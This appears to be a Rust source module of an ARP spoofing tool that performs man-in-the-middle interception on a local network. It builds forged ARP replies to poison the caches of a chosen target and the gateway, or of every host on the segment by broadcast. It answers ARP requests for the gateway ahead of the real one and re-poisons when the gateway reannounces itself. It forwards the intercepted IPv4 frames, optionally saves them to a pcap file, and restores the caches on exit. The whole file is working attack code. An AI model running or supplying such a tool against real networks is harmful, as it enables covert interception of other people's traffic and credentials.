use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::path::PathBuf;
use std::time::Duration;

use bytes::Bytes;
use tokio::{io, signal, time};

use crate::arp::{self, ArpFrame, ArpOpCode, ArpPacket};
use crate::net::{
    DataLinkFrame, DataLinkHeader, DataLinkReceiver, DataLinkSender, DataLinkSocket, MacAddr,
    PcapWriter, read_ipv4,
};

/// Delay between packets of the initial burst.
const BURST_INTERVAL: Duration = Duration::from_millis(20);

#[derive(Clone, Copy)]
struct Host {
    ip: Ipv4Addr,
    mac: MacAddr,
}

/// Writes a frame to the capture file, logging instead of propagating errors,
/// so an I/O failure on the dump does not kill the spoofer.
async fn dump_frame(dump: &mut Option<PcapWriter>, frame: &[u8]) {
    if let Some(dump) = dump {
        if let Err(e) = dump.write_packet(frame).await {
            eprintln!("Error writing packet to the dump file: {e}");
        }
    }
}

fn spoofer_host(iface: &str) -> io::Result<Host> {
    // Get MAC address of the interface
    let our_mac: MacAddr = MacAddr::read(iface)?;

    println!("Our MAC address: {our_mac}");

    // Get IPv4 address of the interface (used as ARP request sender IP)
    let our_ip: Ipv4Addr = read_ipv4(iface)?;

    println!("Our IPv4 address: {our_ip}");

    Ok(Host {
        ip: our_ip,
        mac: our_mac,
    })
}

#[allow(clippy::too_many_arguments)]
pub(super) async fn run(
    iface: String,
    gateway_ip: Ipv4Addr,
    gateway_mac: Option<MacAddr>,
    target_ip: Option<Ipv4Addr>,
    target_mac: Option<MacAddr>,
    rate: u64,
    burst: usize,
    dump: Option<PathBuf>,
) -> io::Result<()> {
    let rate: Duration = Duration::from_millis(rate);

    // Get spoofer MAC and IP
    let spoofer: Host = spoofer_host(&iface)?;

    // ARP table
    let mut table: HashMap<Ipv4Addr, MacAddr> = HashMap::new();

    let sock: DataLinkSocket = DataLinkSocket::new(&iface)?;
    let (tx, mut rx) = sock.split();

    // Create the dump file, if configured
    let mut dump: Option<PcapWriter> = match dump {
        Some(path) => Some(PcapWriter::open(path).await?),
        None => None,
    };

    // Attempt to resolve the gateway MAC, and make gateway Host
    let gateway: Host = match gateway_mac {
        Some(mac) => Host {
            ip: gateway_ip,
            mac,
        },
        None => {
            println!("Resolving gateway MAC address...");
            match arp::resolve_mac(&tx, &mut rx, spoofer.mac, spoofer.ip, gateway_ip).await? {
                Some(mac) => {
                    println!("Gateway MAC address: {mac}");
                    Host {
                        ip: gateway_ip,
                        mac,
                    }
                }
                None => {
                    return Err(io::Error::other("Failed to resolve gateway MAC address"));
                }
            }
        }
    };

    // Attempt to resolve the target MAC, and make target Host
    let target: Option<Host> = match target_ip {
        Some(target_ip) => match target_mac {
            Some(mac) => {
                table.insert(target_ip, mac);
                Some(Host { ip: target_ip, mac })
            }
            None => {
                println!("Resolving target MAC address...");
                match arp::resolve_mac(&tx, &mut rx, spoofer.mac, spoofer.ip, target_ip).await? {
                    Some(target_mac) => {
                        println!("Target MAC address: {target_mac}");
                        table.insert(target_ip, target_mac);
                        Some(Host {
                            ip: target_ip,
                            mac: target_mac,
                        })
                    }
                    None => {
                        // The target IP is explicitly set, so if we can't resolve the MAC, the spoofing should not start.
                        return Err(io::Error::other("Failed to resolve target MAC address"));
                    }
                }
            }
        },
        None => None,
    };

    let result: io::Result<()> = tokio::select! {
        result = spoof_loop(&tx, &mut rx, &mut table, spoofer, gateway, target, rate, burst, &mut dump) => {
            result
        }
        result = signal::ctrl_c() => {
            result
        },
    };

    restore_arp(&tx, &table, spoofer, gateway, burst, &mut dump).await?;

    result
}

fn make_poison_frames(spoofer: Host, gateway: Host, target: Option<Host>) -> Vec<Bytes> {
    // Poison frames, sent on the initial burst and on every tick.
    let mut poisons: Vec<Bytes> = Vec::new();

    match target {
        Some(target) => {
            // Targeted mode, unicast poison to both directions.

            // Target: the gateway is at our MAC
            let to_target = DataLinkFrame {
                eth_dst: target.mac,
                eth_src: spoofer.mac,
                payload: ArpPacket {
                    opcode: ArpOpCode::Reply,
                    sender_mac: spoofer.mac,
                    sender_ip: gateway.ip,
                    target_mac: target.mac,
                    target_ip: target.ip,
                },
            };

            // Gateway: the target is at our MAC
            let to_gateway = DataLinkFrame {
                eth_dst: gateway.mac,
                eth_src: spoofer.mac,
                payload: ArpPacket {
                    opcode: ArpOpCode::Reply,
                    sender_mac: spoofer.mac,
                    sender_ip: target.ip,
                    target_mac: gateway.mac,
                    target_ip: gateway.ip,
                },
            };

            poisons.push(to_target.encode());
            poisons.push(to_gateway.encode());
        }
        None => {
            // Without an explicit target, poison every host on the segment
            // using a gratuitous-style frame (sender IP == target IP == gateway)
            let reply = DataLinkFrame {
                eth_dst: MacAddr::BROADCAST,
                eth_src: spoofer.mac,
                payload: ArpPacket {
                    opcode: ArpOpCode::Reply,
                    sender_mac: spoofer.mac,
                    sender_ip: gateway.ip,
                    target_mac: MacAddr::BROADCAST,
                    target_ip: gateway.ip,
                },
            };

            poisons.push(reply.encode());
        }
    }

    poisons
}

async fn send_poisons(
    tx: &DataLinkSender,
    poisons: &[Bytes],
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    for poison in poisons {
        tx.send(poison).await?;
        dump_frame(dump, poison).await;
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
async fn spoof_loop(
    tx: &DataLinkSender,
    rx: &mut DataLinkReceiver,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    target: Option<Host>,
    rate: Duration,
    burst: usize,
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    let poisons: Vec<Bytes> = make_poison_frames(spoofer, gateway, target);

    // Initial burst to poison the caches as fast as possible
    for i in 0..burst {
        if i > 0 {
            time::sleep(BURST_INTERVAL).await;
        }

        send_poisons(tx, &poisons, dump).await?;
    }

    let mut tick = time::interval(rate);

    loop {
        tokio::select! {
            _ = tick.tick() => {
                send_poisons(tx, &poisons, dump).await?;
            },
            frame = rx.next() => {
                if let Err(e) = handle_frame(frame?, table, spoofer, gateway, target, tx, &poisons, dump).await {
                    eprintln!("Error handling frame: {e}");
                }
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn handle_frame(
    frame: Vec<u8>,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    target: Option<Host>,
    tx: &DataLinkSender,
    poisons: &[Bytes],
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    if let Ok(arp) = ArpFrame::decode(&frame) {
        return handle_arp(
            &arp, &frame, table, spoofer, gateway, target, tx, poisons, dump,
        )
        .await;
    };

    handle_ipv4_packet_forward(frame, table, tx, spoofer, gateway, dump).await
}

#[allow(clippy::too_many_arguments)]
async fn handle_arp(
    arp: &ArpFrame,
    frame: &[u8],
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    target: Option<Host>,
    tx: &DataLinkSender,
    poisons: &[Bytes],
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    // Discard our own packets
    if arp.eth_src == spoofer.mac {
        println!("Received packet from our own MAC address");
        return Ok(());
    }

    // The gateway reannounced an IP that we impersonate.
    // Immediately poison again without waiting for the tick
    if arp.is_gratuitous() && arp.sender_ip == gateway.ip {
        println!("Gateway reannounced an IP that we impersonate, spoofing again");
        dump_frame(dump, frame).await;

        send_poisons(tx, poisons, dump).await?;

        return Ok(());
    }

    if arp.sender_mac != spoofer.mac
        && !arp.sender_mac.is_broadcast()
        && !arp.sender_mac.is_unspecified()
    {
        table.insert(arp.sender_ip, arp.sender_mac);
    }

    match arp.opcode {
        ArpOpCode::Request => {
            println!("ARP request received");

            // Someone is looking for the gateway: answer immediately,
            // so its cache gets poisoned before the gateway can reply.
            // In targeted mode, only answer to the target, so no other
            // host's cache gets poisoned.
            let is_target: bool = target.is_none_or(|t| arp.eth_src == t.mac);

            if arp.target_ip == gateway.ip && is_target {
                dump_frame(dump, frame).await;

                let response = DataLinkFrame {
                    eth_dst: arp.eth_src,
                    eth_src: spoofer.mac,
                    payload: ArpPacket {
                        opcode: ArpOpCode::Reply,
                        sender_mac: spoofer.mac,
                        sender_ip: gateway.ip,
                        target_mac: arp.eth_src,
                        target_ip: arp.sender_ip,
                    },
                };

                let response = response.encode();

                tx.send(&response).await?;
                dump_frame(dump, &response).await;
            }
        }
        ArpOpCode::Reply => {
            println!("ARP reply received");
        }
    }

    Ok(())
}

async fn handle_ipv4_packet_forward(
    mut frame: Vec<u8>,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    tx: &DataLinkSender,
    spoofer: Host,
    gateway: Host,
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    // May be received packets smaller than the Data Link Header, so not return an error here.
    let Ok(dhl) = DataLinkHeader::extract(&frame) else {
        return Ok(());
    };

    // Handle only IPv4 packets
    if dhl.ethertype != 0x0800 || frame.len() < 34 {
        return Ok(());
    }

    // Skip packets destined for our MAC address
    if dhl.eth_dst != spoofer.mac {
        return Ok(());
    }

    let src_ip: Ipv4Addr = Ipv4Addr::new(frame[26], frame[27], frame[28], frame[29]);
    let dst_ip: Ipv4Addr = Ipv4Addr::new(frame[30], frame[31], frame[32], frame[33]);

    if dhl.eth_src == gateway.mac {
        // gateway to target (look in the ARP table)
        match table.get(&dst_ip) {
            Some(victim_mac) => rewrite_mac_addrs(&mut frame, *victim_mac, spoofer.mac),
            None => return Ok(()), // Target not yet seen (trigger ARP request?)
        }
    } else {
        rewrite_mac_addrs(&mut frame, gateway.mac, spoofer.mac);
    }

    // TODO: allow forwarding the traffic to other tools

    println!("Forwarding IPv4 packet from {src_ip} to {dst_ip}");

    // Forward the modified frame
    tx.send(&frame).await?;
    dump_frame(dump, &frame).await;

    Ok(())
}

fn rewrite_mac_addrs(frame: &mut [u8], new_dst: MacAddr, new_src: MacAddr) {
    // The checksums TCP/IP DON'T have to be calculated, as the MAC aren't included in the checksum.
    frame[0..6].copy_from_slice(new_dst.as_bytes());
    frame[6..12].copy_from_slice(new_src.as_bytes());
}

async fn restore_arp(
    tx: &DataLinkSender,
    table: &HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    burst: usize,
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    // Restore gateway -> target
    restore_target_arp(tx, table, spoofer.mac, gateway, burst, dump).await?;

    // Restore target -> gateway
    restore_gateway_arp(tx, table, spoofer.mac, gateway, burst, dump).await?;

    // Restore all others
    restore_broadcast_arp(tx, spoofer.mac, gateway, burst, dump).await?;

    Ok(())
}

async fn restore_target_arp(
    tx: &DataLinkSender,
    table: &HashMap<Ipv4Addr, MacAddr>,
    our_mac: MacAddr,
    gateway: Host,
    burst: usize,
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    println!("Restoring ARP for gateway -> target...");

    for (target_ip, target_mac) in table.iter() {
        if *target_ip == gateway.ip {
            continue;
        }

        let reply = DataLinkFrame {
            eth_dst: *target_mac,
            eth_src: our_mac,
            payload: ArpPacket {
                opcode: ArpOpCode::Reply,
                sender_mac: gateway.mac,
                sender_ip: gateway.ip,
                target_mac: *target_mac,
                target_ip: *target_ip,
            },
        };

        let reply = reply.encode();

        for _ in 0..burst {
            tx.send(&reply).await?;
            dump_frame(dump, &reply).await;
            time::sleep(BURST_INTERVAL).await;
        }

        println!("Restored ARP for {} -> {target_ip}.", gateway.ip);
    }

    Ok(())
}

async fn restore_gateway_arp(
    tx: &DataLinkSender,
    table: &HashMap<Ipv4Addr, MacAddr>,
    our_mac: MacAddr,
    gateway: Host,
    burst: usize,
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    println!("Restoring ARP for target -> gateway...");

    for (target_ip, target_mac) in table.iter() {
        // Skip the gateway itself
        if *target_ip == gateway.ip {
            continue;
        }

        let reply = DataLinkFrame {
            eth_dst: gateway.mac,
            eth_src: our_mac,
            payload: ArpPacket {
                opcode: ArpOpCode::Reply,
                sender_mac: *target_mac,
                sender_ip: *target_ip,
                target_mac: gateway.mac,
                target_ip: gateway.ip,
            },
        };

        let reply = reply.encode();

        for _ in 0..burst {
            tx.send(&reply).await?;
            dump_frame(dump, &reply).await;
            time::sleep(BURST_INTERVAL).await;
        }

        println!("Restored ARP for {target_ip} -> {}.", gateway.ip);
    }

    Ok(())
}

async fn restore_broadcast_arp(
    tx: &DataLinkSender,
    our_mac: MacAddr,
    gateway: Host,
    burst: usize,
    dump: &mut Option<PcapWriter>,
) -> io::Result<()> {
    println!("Restoring ARP for other hosts not seen...");

    let reply = DataLinkFrame {
        eth_dst: MacAddr::BROADCAST,
        eth_src: our_mac,
        payload: ArpPacket {
            opcode: ArpOpCode::Reply,
            sender_mac: gateway.mac,
            sender_ip: gateway.ip,
            target_mac: gateway.mac,
            target_ip: gateway.ip,
        },
    };

    let reply = reply.encode();

    for _ in 0..burst {
        tx.send(&reply).await?;
        dump_frame(dump, &reply).await;
        time::sleep(BURST_INTERVAL).await;
    }

    println!("Restored ARP for other hosts.");

    Ok(())
}
